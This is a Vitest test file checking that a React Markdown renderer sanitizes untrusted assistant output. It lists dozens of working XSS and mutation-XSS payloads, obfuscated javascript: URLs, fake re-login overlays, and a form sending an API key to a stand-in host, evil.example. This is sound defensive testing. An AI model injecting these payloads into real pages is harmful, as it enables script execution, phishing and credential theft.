import { cleanup, render } from '@testing-library/react'
import { afterEach, describe, expect, it } from 'vitest'

import { Markdown } from '../markdown'

/**
 * ACTIVE_SELECTOR matches every element that can run script, load a foreign
 * document, submit data, restyle the page, or re-target relative URLs when it
 * is rendered from untrusted assistant output.
 */
const ACTIVE_SELECTOR = [
  'script',
  'iframe',
  'frame',
  'frameset',
  'object',
  'embed',
  'applet',
  'form',
  'button',
  'select',
  'textarea',
  'input:not([type="checkbox"])',
  'style',
  'link',
  'meta',
  'base',
  'svg',
  'math',
  'video',
  'audio',
  'portal',
  'template',
  'dialog',
].join(',')

/**
 * collectActive returns the tag names of dangerous elements rendered anywhere
 * in the document, including nodes React 19 hoists into document.head.
 */
function collectActive(container: HTMLElement): string[] {
  const found = new Set<string>()
  for (const node of container.querySelectorAll(ACTIVE_SELECTOR)) {
    // KaTeX emits trusted MathML for accessibility; only foreign math counts.
    if (node.closest('.katex')) continue
    found.add(node.tagName.toLowerCase())
  }
  for (const node of document.head.querySelectorAll(ACTIVE_SELECTOR)) {
    // Only head nodes that reference the payload host can come from markdown.
    if (attributeText(node).includes('evil.example')) {
      found.add(`head>${node.tagName.toLowerCase()}`)
    }
  }
  return [...found]
}

/** attributeText joins every attribute value of node for host matching. */
function attributeText(node: Element): string {
  return Array.from(node.attributes, (attr) => attr.value).join(' ')
}

/**
 * collectUnsafeAttributes returns attribute names that are executable or that
 * escape the markdown container's styling, such as inline event handlers,
 * inline styles, srcdoc, and form-submission targets.
 */
function collectUnsafeAttributes(container: HTMLElement): string[] {
  const found = new Set<string>()
  for (const node of container.querySelectorAll('*')) {
    if (node.closest('.katex')) continue
    for (const attr of Array.from(node.attributes)) {
      const name = attr.name.toLowerCase()
      if (
        name.startsWith('on') ||
        name === 'style' ||
        name === 'srcdoc' ||
        name === 'formaction' ||
        name === 'action' ||
        name === 'http-equiv'
      ) {
        found.add(`${node.tagName.toLowerCase()}[${name}]`)
      }
    }
  }
  return [...found]
}

/**
 * normalizeUrlForCheck mirrors how a browser reads a URL attribute before it
 * picks the scheme: leading C0 controls and spaces are dropped and ASCII tabs
 * and newlines are removed anywhere, so obfuscated schemes are still caught.
 */
function normalizeUrlForCheck(value: string): string {
  // eslint-disable-next-line no-control-regex
  return value.replace(/^[\u0000-\u0020]+/, '').replace(/[\t\n\r]/g, '')
}

/**
 * isUnsafeUrl reports whether value uses a scheme that can execute script or
 * smuggle a document: javascript:, vbscript:, or any data: URL other than a
 * base64 raster image.
 */
function isUnsafeUrl(value: string): boolean {
  const url = normalizeUrlForCheck(value).toLowerCase()
  if (url.startsWith('javascript:') || url.startsWith('vbscript:')) {
    return true
  }
  return (
    url.startsWith('data:') &&
    !/^data:image\/(png|jpe?g|gif|webp|avif);base64,/.test(url)
  )
}

/**
 * collectUnsafeUrls returns the URL attributes, srcset candidates included,
 * whose scheme can execute script or smuggle a document.
 */
function collectUnsafeUrls(container: HTMLElement): string[] {
  const found: string[] = []
  for (const node of container.querySelectorAll(
    '[href],[src],[xlink\\:href],[srcset]',
  )) {
    for (const name of ['href', 'src', 'xlink:href']) {
      const value = node.getAttribute(name) ?? ''
      if (value && isUnsafeUrl(value)) {
        found.push(`${node.tagName.toLowerCase()}[${name}]`)
      }
    }
    const srcset = node.getAttribute('srcset') ?? ''
    // A srcset candidate is a URL followed by an optional descriptor; data:
    // URLs may contain commas, so only the start of each candidate counts.
    if (/(^|,)\s*(javascript|vbscript|data):/i.test(srcset)) {
      const candidates = srcset.split(/,\s*(?=[a-z]+:|\/|\.)/i)
      if (candidates.some((candidate) => isUnsafeUrl(candidate.trim()))) {
        found.push(`${node.tagName.toLowerCase()}[srcset]`)
      }
    }
  }
  return found
}

const xssCases: Array<[string, string]> = [
  ['inline script', '<script>window.__xss = 1</script>'],
  [
    'async external script',
    '<script async src="https://evil.example/x.js"></script>',
  ],
  [
    'iframe srcdoc',
    '<iframe srcdoc="<script>parent.__xss = 1</script>"></iframe>',
  ],
  ['iframe src', '<iframe src="https://evil.example/phish"></iframe>'],
  ['object data', '<object data="https://evil.example/x.html"></object>'],
  ['embed src', '<embed src="https://evil.example/x.swf">'],
  [
    'form action with credential input',
    '<form action="https://evil.example/collect" method="post"><input name="api_key" type="password"><button>Verify</button></form>',
  ],
  [
    'button formaction',
    '<button formaction="https://evil.example/b">go</button>',
  ],
  [
    'img onerror',
    '<img src="https://example.com/x.png" onerror="window.__xss = 1">',
  ],
  ['div onclick', '<div onclick="window.__xss = 1">click me</div>'],
  ['raw anchor javascript', '<a href="javascript:window.__xss = 1">x</a>'],
  ['markdown link javascript', '[x](javascript:window.__xss=1)'],
  ['markdown angle link javascript', '[x](<javascript:window.__xss=1>)'],
  ['entity-encoded javascript', '<a href="&#106;avascript:alert(1)">x</a>'],
  ['mixed-case javascript', '<a href="JaVaScRiPt:alert(1)">x</a>'],
  ['padded javascript', '<a href="  javascript:alert(1)">x</a>'],
  ['img javascript', '<img src="javascript:alert(1)">'],
  [
    'details ontoggle',
    '<details open ontoggle="window.__xss = 1"><summary>s</summary>x</details>',
  ],
  [
    'checkbox autofocus onfocus',
    '<input type="checkbox" disabled autofocus onfocus="window.__xss = 1">',
  ],
  [
    'raw anchor data html',
    '<a href="data:text/html,<script>alert(1)</script>">x</a>',
  ],
  ['raw img data html', '<img src="data:text/html;base64,PHNjcmlwdD4=">'],
  [
    'markdown svg data image',
    '![x](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciLz4=)',
  ],
  [
    'raw svg data image',
    '<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciLz4=">',
  ],
  ['svg script', '<svg><script>window.__xss = 1</script></svg>'],
  ['svg onload', '<svg onload="window.__xss = 1"><circle r="5"/></svg>'],
  [
    'svg animate href',
    '<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text y="20">x</text></a></svg>',
  ],
  ['math xlink', '<math><mi xlink:href="javascript:alert(1)">x</mi></math>'],
  ['style element', '<style>body { display: none }</style>'],
  [
    'inline style overlay',
    '<div style="position:fixed;inset:0;z-index:9999;background:white">Session expired</div>',
  ],
  [
    'stylesheet link',
    '<link rel="stylesheet" href="https://evil.example/x.css">',
  ],
  [
    'meta refresh',
    '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
  ],
  ['base href', '<base href="https://evil.example/">'],
  ['textarea', '<textarea name="api_key">x</textarea>'],
  ['video onerror', '<video src="x" onerror="window.__xss = 1"></video>'],
  ['template', '<template><script>window.__xss = 1</script></template>'],
  ['dialog', '<dialog open>Re-enter your API key</dialog>'],
  // Scheme obfuscation: entities, tabs, newlines, control characters.
  ['tab-split javascript', '<a href="java&#x09;script:alert(1)">x</a>'],
  ['newline-split javascript', '<a href="jav&#x0A;ascript:alert(1)">x</a>'],
  ['control-prefixed javascript', '<a href="&#x01;javascript:alert(1)">x</a>'],
  [
    'named-entity colon javascript',
    '<a href="javascript&colon;alert(1)">x</a>',
  ],
  ['raw anchor vbscript', '<a href="vbscript:msgbox(1)">x</a>'],
  ['markdown link vbscript', '[x](vbscript:msgbox(1))'],
  [
    'markdown reference link javascript',
    '[x][r]\n\n[r]: javascript:window.__xss=1',
  ],
  // A second image sink outside the img element.
  [
    'picture source svg data srcset',
    '<picture><source srcset="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciLz4="><img src="https://example.com/x.png" alt="x"></picture>',
  ],
]

/**
 * mxssCases are mutation XSS payloads that broke string-based sanitizers.
 * React builds DOM nodes from the sanitized tree, so nothing is re-parsed.
 * Unclosed raw-text elements may swallow the rest of the answer, so only the
 * absence of active content is asserted for them.
 */
const mxssCases: Array<[string, string]> = [
  [
    'mxss svg style break-out',
    '<svg><p><style><img src=x onerror="window.__xss = 1"></style></p></svg>',
  ],
  [
    'mxss math mglyph style',
    '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
  ],
  [
    'mxss noscript title',
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
  ],
  [
    'mxss nested form math',
    '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>',
  ],
]

afterEach(() => {
  cleanup()
  for (const node of document.head.querySelectorAll('*')) {
    if (attributeText(node).includes('evil.example')) node.remove()
  }
})

describe('Markdown untrusted HTML sanitization', () => {
  it.each(xssCases)('neutralizes %s', (_name, payload) => {
    const source = `Here is the answer.\n\n${payload}\n\nThanks.`
    const { container } = render(<Markdown>{source}</Markdown>)

    expect(collectActive(container)).toEqual([])
    expect(collectUnsafeAttributes(container)).toEqual([])
    expect(collectUnsafeUrls(container)).toEqual([])
    expect(container.textContent).toContain('Here is the answer.')
    expect(container.textContent).toContain('Thanks.')
  })

  it.each(mxssCases)('leaves no active content for %s', (_name, payload) => {
    const { container } = render(<Markdown>{payload}</Markdown>)

    expect(collectActive(container)).toEqual([])
    expect(collectUnsafeAttributes(container)).toEqual([])
    expect(collectUnsafeUrls(container)).toEqual([])
  })

  it('prefixes raw element ids so they cannot clobber page globals', () => {
    const { container } = render(
      <Markdown>{'<div id="root" name="config">x</div>'}</Markdown>,
    )
    expect(container.querySelector('#root')).toBeNull()
    expect(container.querySelector('[name="config"]')).toBeNull()
    expect(container.textContent).toContain('x')
  })

  it('renders picture fallbacks only through the img sink', () => {
    const { container } = render(
      <Markdown>
        {
          '<picture><source media="(prefers-color-scheme: dark)" srcset="https://evil.example/track.png"><img src="https://example.com/light.png" alt="logo"></picture>'
        }
      </Markdown>,
    )
    expect(container.querySelector('source, [srcset]')).toBeNull()
    const img = container.querySelector('img')
    expect(img?.getAttribute('src')).toBe('https://example.com/light.png')
    expect(img?.getAttribute('alt')).toBe('logo')
  })

  it('keeps KaTeX commands that need trust inert', () => {
    const { container } = render(
      <Markdown>
        {[
          '$\\href{javascript:window.__xss=1}{x}$',
          '$\\url{https://evil.example/u}$',
          '$\\includegraphics{https://evil.example/x.png}$',
          '$\\htmlStyle{position:fixed;inset:0}{x}$',
          '$\\htmlId{root}{x}$',
        ].join('\n\n')}
      </Markdown>,
    )
    expect(container.querySelectorAll('.katex').length).toBe(5)
    expect(container.querySelector('.katex a, .katex img')).toBeNull()
    expect(container.querySelector('#root')).toBeNull()
    for (const node of container.querySelectorAll('[style]')) {
      expect(node.getAttribute('style') ?? '').not.toMatch(/position|inset/)
    }
    expect(container.innerHTML).not.toContain('evil.example/x.png"')
  })

  it('drops raw class names that could reuse app styling for overlays', () => {
    const { container } = render(
      <Markdown>
        {'<div class="fixed inset-0 z-50 bg-background">Sign in again</div>'}
      </Markdown>,
    )
    expect(container.querySelector('.fixed')).toBeNull()
    expect(container.textContent).toContain('Sign in again')
  })
})
